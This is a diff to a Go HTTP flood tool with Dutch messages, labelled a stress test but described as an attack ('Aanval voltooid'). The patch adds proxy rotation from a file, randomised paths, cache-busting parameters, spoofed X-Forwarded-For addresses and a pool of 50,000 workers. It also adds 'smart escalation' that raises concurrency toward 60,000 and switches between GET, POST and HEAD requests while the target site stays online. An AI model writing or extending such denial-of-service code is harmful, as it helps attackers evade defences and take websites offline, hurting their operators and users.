@@ -1,15 +1,25 @@
 package main
 
 import (
+	"bufio"
+	"bytes"
 	"fmt"
 	"io"
 	"math/rand"
 	"net/http"
 	"net/url"
+	"os"
 	"strings"
 	"sync"
 	"sync/atomic"
 	"time"
+)
+
+var (
+	proxyList []string
+	commonPaths = []string{
+		"/", "/api/v1", "/login", "/search", "/wp-admin", "/admin", "/shop", "/cart",
+	}
 )
 
 
@@ -23,6 +33,11 @@ type domainStats struct {
 	siteDownSince   time.Time
 	mu              sync.Mutex
 	statusLog       []string
+
+	// Escalation
+	level           int
+	vector          string
+	concurrency     int32
 }
 
 func applyLevelSettings(o *options) {
@@ -67,6 +82,10 @@ func applyLevelSettings(o *options) {
 }
 
 func runAttack(domains []string, o options) {
+	if o.proxyFile != "" {
+		loadProxies(o.proxyFile)
+	}
+
 	fmt.Printf("⏳ Start L7 Stress Test voor %d minuten op %d doelen...\n", o.attackMinutes, len(domains))
 
 	deadline := time.Now().Add(time.Duration(o.attackMinutes) * time.Minute)
@@ -80,32 +99,23 @@ func runAttack(domains []string, o options) {
 		}
 
 		s := &domainStats{
-			domain:    d,
-			targetURL: targetURL,
+			domain:      d,
+			targetURL:   targetURL,
+			level:       o.level,
+			vector:      "GET",
+			concurrency: int32(o.concurrency / len(domains)),
+		}
+		if s.concurrency == 0 {
+			s.concurrency = 1
 		}
 		allStats = append(allStats, s)
 
 		// Start monitor
 		go startHealthMonitor(s, deadline)
 
-		// Start Attackers
-		workersPerDomain := o.concurrency / len(domains)
-		if workersPerDomain == 0 {
-			workersPerDomain = 1
-		}
-
-		client := &http.Client{
-			Timeout: 10 * time.Second,
-			Transport: &http.Transport{
-				DisableKeepAlives:   o.noKeepAlive,
-				MaxIdleConns:        o.concurrency * 2,
-				MaxIdleConnsPerHost: o.concurrency * 2,
-				IdleConnTimeout:     10 * time.Second,
-			},
-		}
-
-		for i := 0; i < workersPerDomain; i++ {
-			go worker(client, targetURL, s, deadline)
+		// Start Attackers with dynamic workers
+		for i := 0; i < 50000; i++ { // Start a large pool of dormant workers
+			go worker(s, deadline, i, o.noKeepAlive)
 		}
 	}
 
@@ -140,29 +150,70 @@ func runAttack(domains []string, o options) {
 	fmt.Println("\n🏁 Aanval voltooid. Tijd verstreken.")
 }
 
-func worker(client *http.Client, targetURL string, s *domainStats, deadline time.Time) {
+func worker(s *domainStats, deadline time.Time, id int, noKeepAlive bool) {
+	transport := &http.Transport{
+		DisableKeepAlives:   noKeepAlive,
+		MaxIdleConns:        10,
+		MaxIdleConnsPerHost: 10,
+		IdleConnTimeout:     5 * time.Second,
+	}
+
+	client := &http.Client{
+		Timeout:   7 * time.Second,
+		Transport: transport,
+	}
+
 	for time.Now().Before(deadline) {
-		// Random Cache-Bypass
-		cb := fmt.Sprintf("%d", rand.Int63())
-		u, _ := url.Parse(targetURL)
+		// Dynamic concurrency control
+		if int32(id) >= atomic.LoadInt32(&s.concurrency) {
+			time.Sleep(500 * time.Millisecond)
+			continue
+		}
+
+		// Proxy rotation
+		if len(proxyList) > 0 {
+			p := proxyList[rand.Intn(len(proxyList))]
+			proxyURL, _ := url.Parse("http://" + p)
+			transport.Proxy = http.ProxyURL(proxyURL)
+		}
+
+		// Randomized Path
+		pId := rand.Intn(len(commonPaths))
+		targetPath := s.targetURL + commonPaths[pId]
+
+		// Cache-Bypass
+		u, _ := url.Parse(targetPath)
 		q := u.Query()
-		q.Set("cb", cb)
+		q.Set("cb", fmt.Sprintf("%d", rand.Int63()))
 		u.RawQuery = q.Encode()
 
-		req, _ := http.NewRequest("GET", u.String(), nil)
+		var req *http.Request
+		s.mu.Lock()
+		v := s.vector
+		s.mu.Unlock()
+
+		switch v {
+		case "POST":
+			jsonData := []byte(fmt.Sprintf(`{"id":%d,"data":"%d","query":"%s"}`, rand.Int63(), rand.Int63(), getRandomUserAgent()))
+			req, _ = http.NewRequest("POST", u.String(), bytes.NewBuffer(jsonData))
+			req.Header.Set("Content-Type", "application/json")
+		case "HEAD":
+			req, _ = http.NewRequest("HEAD", u.String(), nil)
+		default:
+			req, _ = http.NewRequest("GET", u.String(), nil)
+		}
+
 		req.Header.Set("User-Agent", getRandomUserAgent())
 		req.Header.Set("Referer", getRandomReferrer())
-		req.Header.Set("Cache-Control", "no-cache")
+		req.Header.Set("X-Forwarded-For", fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255)))
 
 		atomic.AddInt64(&s.totalRequests, 1)
 		resp, err := client.Do(req)
 		if err != nil {
 			atomic.AddInt64(&s.failedRequests, 1)
 		} else {
-			// Fast body discard
 			io.Copy(io.Discard, resp.Body)
 			resp.Body.Close()
-
 			if resp.StatusCode >= 500 {
 				atomic.AddInt64(&s.failedRequests, 1)
 			} else {
@@ -170,6 +221,23 @@ func worker(client *http.Client, targetURL string, s *domainStats, deadline time
 			}
 		}
 	}
+}
+
+func loadProxies(file string) {
+	f, err := os.Open(file)
+	if err != nil {
+		fmt.Printf("[!] Error laden proxies: %v\n", err)
+		return
+	}
+	defer f.Close()
+	scanner := bufio.NewScanner(f)
+	for scanner.Scan() {
+		p := strings.TrimSpace(scanner.Text())
+		if p != "" {
+			proxyList = append(proxyList, p)
+		}
+	}
+	fmt.Printf("[*] %d Proxies geladen.\n", len(proxyList))
 }
 
 func runSitePlof(o options) {
@@ -243,8 +311,10 @@ func startHealthMonitor(s *domainStats, deadline time.Time) {
 	defer ticker.Stop()
 	time.Sleep(1 * time.Second)
 
+	checkCount := 0
 	for time.Now().Before(deadline) {
 		<-ticker.C
+		checkCount++
 		req, _ := http.NewRequest("GET", s.targetURL, nil)
 		req.Header.Set("User-Agent", "NetScope-Monitor/1.0")
 
@@ -289,9 +359,29 @@ func startHealthMonitor(s *domainStats, deadline time.Time) {
 					fmt.Println("\n" + msg)
 					s.mu.Unlock()
 				} else {
-					// Site is still ONLINE, increase pressure?
-					// This is a simple escalation logic
-					fmt.Printf("[%s] 📈 %s is nog online, we gooien het level omhoog...\n", time.Now().Format(time.TimeOnly), s.domain)
+					// Smart Escalation
+					if checkCount%5 == 0 { // Every 15 seconds of remaining online
+						s.mu.Lock()
+						// Increase concurrency
+						newConc := atomic.LoadInt32(&s.concurrency) + 1000
+						if newConc > 60000 {
+							newConc = 60000
+						}
+						atomic.StoreInt32(&s.concurrency, newConc)
+
+						// Rotate Vectors
+						oldV := s.vector
+						switch oldV {
+						case "GET":
+							s.vector = "POST"
+						case "POST":
+							s.vector = "HEAD"
+						default:
+							s.vector = "GET"
+						}
+						fmt.Printf("[%s] 📈 %s is nog online. Escalatie: %d workers | Vector: %s\n", time.Now().Format(time.TimeOnly), s.domain, newConc, s.vector)
+						s.mu.Unlock()
+					}
 				}
 			}
 		}
